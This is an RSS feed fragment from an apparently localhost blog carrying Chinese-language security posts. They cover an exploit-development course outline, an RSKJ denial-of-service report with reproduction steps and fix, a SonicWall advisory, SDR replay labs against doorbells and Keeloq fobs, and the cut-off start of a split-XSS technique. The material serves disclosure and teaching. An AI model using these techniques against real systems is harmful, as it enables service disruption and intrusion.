        <guid>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4blackhat-2016%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C%E8%AF%BE%E7%A8%8B-%E8%AF%BE%E5%89%8D%E6%95%99%E7%A8%8B%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%8C%91%E6%88%98/</guid>
        <description>&lt;h1 id=&#34;blackhat-2016漏洞实验课程&#34;&gt;Blackhat 2016漏洞实验课程
&lt;/h1&gt;&lt;h2 id=&#34;课前教程模块&#34;&gt;课前教程模块
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;基础缓冲区溢出&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;32位栈溢出原理与实践&lt;/li&gt;
&lt;li&gt;通过恶意输入覆盖EIP寄存器&lt;/li&gt;
&lt;li&gt;使用坏字符检测定位内存冲突&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;现代绕过技术&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DEP/NX保护机制的ROP链构造&lt;/li&gt;
&lt;li&gt;绕过ASLR的内存地址泄露技术&lt;/li&gt;
&lt;li&gt;使用JIT喷射对抗控制流保护&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;crackme挑战集&#34;&gt;Crackme挑战集
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Level1&lt;/strong&gt;&lt;br&gt;
基础栈溢出（无保护机制）&lt;br&gt;
要求：通过覆盖返回地址执行shellcode&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Level2&lt;/strong&gt;&lt;br&gt;
带Canary保护的栈溢出&lt;br&gt;
要求：爆破/泄露栈金丝雀值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Level3&lt;/strong&gt;&lt;br&gt;
完全防护环境（DEP+ASLR）&lt;br&gt;
要求：组合使用ROP与内存泄露技术&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;实验环境要求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VMware Workstation 12+&lt;/li&gt;
&lt;li&gt;Kali Linux虚拟机&lt;/li&gt;
&lt;li&gt;预装GDB-Peda/Pwndbg调试器&lt;/li&gt;
&lt;li&gt;Python Exploit开发套件&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>RSKJ服务器拒绝服务漏洞分析与修复</title>
        <link>http://localhost:1313/p/rskj%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D/</link>
        <pubDate>Sat, 02 Aug 2025 20:25:35 +0800</pubDate>
        
        <guid>http://localhost:1313/p/rskj%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D/</guid>
        <description>&lt;h1 id=&#34;rskj服务器拒绝服务漏洞报告&#34;&gt;RSKJ服务器拒绝服务漏洞报告
&lt;/h1&gt;&lt;h2 id=&#34;漏洞摘要&#34;&gt;漏洞摘要
&lt;/h2&gt;&lt;p&gt;攻击者通过发送特制的UDPv6数据包可导致RSKJ服务器停止处理网络流量，最终引发内存耗尽崩溃。&lt;/p&gt;
&lt;h2 id=&#34;复现步骤&#34;&gt;复现步骤
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;下载受影响版本：https://github.com/rsksmart/rskj/releases/download/FINGERROOT-5.0.0/rskj-core-5.0.0-FINGERROOT-all.jar&lt;/li&gt;
&lt;li&gt;服务端运行：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;classpath&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rskj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FINGERROOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;all&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;jar&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Drpc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;providers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;web&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;cors&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Drpc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;providers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;web&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ws&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;enabled&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;co&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;rsk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;该命令会开放UDPv6端口5050&lt;/li&gt;
&lt;li&gt;客户端安装Python3及pysha3库，使用PoC脚本攻击服务端&lt;/li&gt;
&lt;li&gt;服务器将永久处理单个UDP数据包，拒绝其他节点请求，数分钟后应用崩溃&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;根本原因&#34;&gt;根本原因
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;bytesToLength&lt;/code&gt;函数返回-5导致length变为0：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// RLP.java第432行&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bytesToLength返回&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 第440行&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;该返回值被合法接受&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 第403-405行&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;position变量无法更新&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;影响&#34;&gt;影响
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;UDPv6端口5050停止处理入站流量&lt;/li&gt;
&lt;li&gt;最终导致内存耗尽崩溃&lt;/li&gt;
&lt;li&gt;由于&lt;code&gt;decode2&lt;/code&gt;函数的广泛使用，可能影响其他服务入口点&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;修复方案&#34;&gt;修复方案
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;限制&lt;code&gt;bytesToLength&lt;/code&gt;仅返回非负值&lt;/li&gt;
&lt;li&gt;添加长度校验（建议）：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;BYTES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(...);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;修复提交&#34;&gt;修复提交
&lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/rsksmart/rskj/commit/6965fa60f743d911ee106b542cec80a1417266b1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/rsksmart/rskj/commit/6965fa60f743d911ee106b542cec80a1417266b1&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞奖励&#34;&gt;漏洞奖励
&lt;/h2&gt;&lt;p&gt;$5,000&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SonicWall SMA 100系列管理界面多重漏洞可能导致远程代码执行</title>
        <link>http://localhost:1313/p/sonicwall-sma-100%E7%B3%BB%E5%88%97%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%E5%A4%9A%E9%87%8D%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
        <pubDate>Sat, 02 Aug 2025 19:42:30 +0800</pubDate>
        
        <guid>http://localhost:1313/p/sonicwall-sma-100%E7%B3%BB%E5%88%97%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%E5%A4%9A%E9%87%8D%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
        <description>&lt;h1 id=&#34;sonicwall-secure-mobile-access-sma-100系列管理界面多重漏洞可能导致远程代码执行&#34;&gt;SonicWall Secure Mobile Access (SMA) 100系列管理界面多重漏洞可能导致远程代码执行
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;MS-ISAC公告编号&lt;/strong&gt;：2025-046&lt;br&gt;
&lt;strong&gt;发布日期&lt;/strong&gt;：2025/05/05&lt;/p&gt;
&lt;h2 id=&#34;概述&#34;&gt;概述
&lt;/h2&gt;&lt;p&gt;SonicWall Secure Mobile Access (SMA) 100管理界面发现多个安全漏洞，可能导致远程代码执行。SonicWall SMA是企业用于提供远程应用访问的统一安全网关。攻击者组合利用这些漏洞可实现远程代码执行，进而导致会话劫持和系统完全沦陷。&lt;/p&gt;
&lt;h2 id=&#34;威胁情报&#34;&gt;威胁情报
&lt;/h2&gt;&lt;p&gt;WatchTowr报告显示CVE-2024-38475和CVE-2023-44221已在真实攻击中被利用。CISA已将这两个漏洞列入已知被利用漏洞目录(KEV)。&lt;/p&gt;
&lt;h2 id=&#34;受影响系统&#34;&gt;受影响系统
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;SMA 200&lt;/li&gt;
&lt;li&gt;SMA 210&lt;/li&gt;
&lt;li&gt;SMA 400&lt;/li&gt;
&lt;li&gt;SMA 410&lt;/li&gt;
&lt;li&gt;SMA 500v&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;风险等级&#34;&gt;风险等级
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;政府机构：中大型政府实体(高危)/小型政府实体(中危)&lt;/li&gt;
&lt;li&gt;企业：中大型企业(高危)/小型企业(中危)&lt;/li&gt;
&lt;li&gt;家庭用户：低危&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;p&gt;漏洞详情如下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击策略&lt;/strong&gt;：初始访问(TA0001)&lt;br&gt;
&lt;strong&gt;技术手段&lt;/strong&gt;：利用公开应用漏洞(T1190)：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;SMA100 SSL-VPN管理界面存在特殊元素过滤不当漏洞，具有管理员权限的远程攻击者可注入任意命令(CVE-2023-44221)&lt;/li&gt;
&lt;li&gt;Apache HTTP Server 2.4.59及更早版本的mod_rewrite存在输出转义缺陷，攻击者可映射URL到服务器允许访问的文件系统位置(CVE-2024-38475)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;组合利用这些漏洞可实现远程代码执行。&lt;/p&gt;
&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;立即应用补丁&lt;/strong&gt;：测试后立即安装SonicWall提供的更新(M1051)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保障措施7.1：建立并维护漏洞管理流程&lt;/li&gt;
&lt;li&gt;保障措施7.2：建立基于风险的修复策略&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;自动化漏洞管理&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保障措施7.4：每月执行自动化应用补丁管理&lt;/li&gt;
&lt;li&gt;保障措施7.5：每季度执行自动化漏洞扫描&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网络架构加固&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保障措施12.1：保持网络基础设施更新&lt;/li&gt;
&lt;li&gt;保障措施12.2：建立安全网络架构&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;渗透测试&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保障措施18.1：建立渗透测试计划&lt;/li&gt;
&lt;li&gt;保障措施18.2：定期执行外部渗透测试&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;最小权限原则&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保障措施4.7：管理默认账户&lt;/li&gt;
&lt;li&gt;保障措施5.5：维护服务账户清单&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;应用防护&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保障措施16.13：执行应用渗透测试&lt;/li&gt;
&lt;li&gt;保障措施10.5：启用防漏洞利用功能&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;参考链接
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cisa.gov/news-events/alerts/2025/05/01/cisa-adds-two-known-exploited-vulnerabilities-catalog&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CISA公告&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-38475&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2024-38475&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-44221&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2023-44221&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2023-0018&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SonicWall安全公告&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>软件定义无线电(SDR)攻防实验：无线门铃与Keeloq钥匙扣攻击实战</title>
        <link>http://localhost:1313/p/%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E6%97%A0%E7%BA%BF%E7%94%B5sdr%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C%E6%97%A0%E7%BA%BF%E9%97%A8%E9%93%83%E4%B8%8Ekeeloq%E9%92%A5%E5%8C%99%E6%89%A3%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/</link>
        <pubDate>Sat, 02 Aug 2025 18:26:56 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E6%97%A0%E7%BA%BF%E7%94%B5sdr%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C%E6%97%A0%E7%BA%BF%E9%97%A8%E9%93%83%E4%B8%8Ekeeloq%E9%92%A5%E5%8C%99%E6%89%A3%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/</guid>
        <description>&lt;h1 id=&#34;wild-west-hackin-fest-wwhf-sdr-实验室&#34;&gt;Wild West Hackin&amp;rsquo; Fest (WWHF) SDR 实验室
&lt;/h1&gt;&lt;p&gt;作者：David Fletcher //&lt;/p&gt;
&lt;p&gt;在WWHF会议期间，许多参会者索要软件定义无线电(SDR)实验的器材清单和源代码以便在家实践。由于需要根据会议期间的观察修改实验文档和代码，直到现在才完成整理。以下是完整的WWHF SDR实验资料，每个实验包含：器材清单、实验指南和实验脚本，下载全部三个文件即可开始实践。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注&lt;/strong&gt;：器材清单中的产品不代表官方推荐，仅为我们实际使用的设备。&lt;/p&gt;
&lt;h2 id=&#34;无线门铃攻击实验&#34;&gt;无线门铃攻击实验
&lt;/h2&gt;&lt;p&gt;本实验演示对无线门铃信号的捕获、分析与合成，通过手动解码和重放攻击展示防重放机制的必要性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;器材清单&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(1) 无线门铃 - $16.99&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://www.amazon.com/Heath-Zenith-DL-6166-Wireless-Doorbell/dp/B00HDDD9HI&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;亚马逊链接&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;(1) RTL-SDR接收器 - $19.95&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://www.amazon.com/NooElec-NESDR-Mini-Compatible-Packages/dp/B009U7WZCA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;亚马逊链接&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;(1) YardStick One发射器 - $123.95&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://www.amazon.com/YARD-Stick-One-Transceiver-Antenna/dp/B06Y1RVHBP&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;亚马逊链接&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;实验文件&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;实验手册&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;攻击脚本&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;keeloq钥匙扣攻击实验&#34;&gt;Keeloq钥匙扣攻击实验
&lt;/h2&gt;&lt;p&gt;本实验演示汽车钥匙滚动码信号的捕获与分析，揭示滚动码的保护机制及带外接收重放漏洞。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;器材清单&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(1) 迷你面包板 - $5.69&lt;/li&gt;
&lt;li&gt;(1) 面包板电源模块 - $5.49&lt;/li&gt;
&lt;li&gt;(1) 面包板跳线 - $6.29&lt;/li&gt;
&lt;li&gt;(1) 2.54mm单排排针 - $5.59&lt;/li&gt;
&lt;li&gt;(2) PiStop交通信号灯 - $7.82&lt;/li&gt;
&lt;li&gt;(1) Keeloq钥匙套件 - $21.95&lt;/li&gt;
&lt;li&gt;(1) RTL-SDR接收器 - $19.95&lt;/li&gt;
&lt;li&gt;(1) YardStick One发射器 - $123.95&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;实验文件&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;接线图&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;实验手册&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;解码脚本&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;想深入学习？Antisyphon提供可自主定价的进阶培训课程，支持直播/点播学习。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>分割XSS攻击载荷：突破20字符限制的技巧</title>
        <link>http://localhost:1313/p/%E5%88%86%E5%89%B2xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E7%AA%81%E7%A0%B420%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7/</link>
        <pubDate>Sat, 02 Aug 2025 16:35:35 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%86%E5%89%B2xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E7%AA%81%E7%A0%B420%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7/</guid>
        <description>&lt;h1 id=&#34;split-xss---分割xss攻击载荷&#34;&gt;Split XSS - 分割XSS攻击载荷
&lt;/h1&gt;&lt;h2 id=&#34;突破20字符限制的xss攻击技术&#34;&gt;突破20字符限制的XSS攻击技术
&lt;/h2&gt;&lt;p&gt;在测试一个编辑表单时，我发现8个输入字段都存在XSS漏洞，但每个字段限制为20个字符。常规XSS攻击无法在如此短的字符限制下完成，于是我开发了以下技术：&lt;/p&gt;
&lt;h3 id=&#34;基本攻击思路&#34;&gt;基本攻击思路
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;在第一个输入中开启&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签但不闭合：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
